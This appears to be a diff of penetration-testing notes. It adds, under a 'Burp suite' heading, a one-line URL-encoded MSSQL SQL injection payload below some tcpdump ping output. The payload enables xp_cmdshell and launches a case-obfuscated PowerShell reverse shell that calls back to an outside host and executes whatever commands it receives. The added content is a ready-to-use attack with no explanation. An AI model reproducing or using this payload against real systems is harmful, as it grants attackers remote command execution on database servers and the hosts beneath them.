@@ -96,3 +96,8 @@ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 17:22:31.579471 IP x.x.x.x > x.x.x.x: ICMP echo request, id 1, seq 1, length 40
 17:22:31.579546 IP x.x.x.x > x.x.x.x: ICMP echo reply, id 1, seq 1, length 40
+
+
+Burp suite
+#MSSQL sqli one line powershell url encoded
+#%3bEXEC+sp_configure+'show+advanced+options',+1%3bRECONFIGURE+WITH+OVERRIDE%3bEXEC+sp_configure+'xp_cmdshell',+1%3bRECONFIGURE+WITH+OVERRIDE%3bdrop+table+fighter%3bcreate+table+fighter+(out+varchar(8000))%3binsert+into+fighter+(out)+execute+Xp_cMdsHelL+'C%3a\WIndOWs\sySwOw64\WINdOwspOweRshEll\v1.0\poWersHeLl.Exe+"$clIEnT+%3d+NEw-ObJect+SYstEm.nEt.SOckEts.TcPclIeNt(\"x.x.x.x\",80)%3b$stReAm+%3d+$clIEnT.GetsTrEam()%3b[byte[]]$bYtEs+%3d+0..65535|%25{0}%3bwHIle(($i+%3d+$stReAm.Read($bYtEs,+0,+$bYtEs.LEnGth))+-ne+0){%3b$dAta+%3d+(NEW-oBjecT+-TypeNAme+SYsTem.tExt.ASCIiENcoDing).GEtstRInG($bYtEs,0,+$i)%3b$sEndback+%3d+(iEX+$data+2>%261+|+OUt-stRing+)%3b$Sendback2+%3d+$sEndback+%2b+\"sH3lL+\"+%2b+(pWd).PAth+%2b+\"^>+\"%3b$senDbyte+%3d+([texT.eNCodIng]%3a%3aAScIi).GEtByTes($Sendback2)%3b$stReAm.WRite($senDbyte,0,$senDbyte.Length)%3b$stReAm.FLuSh()}%3b$clIEnT.CloSe()"'%3b
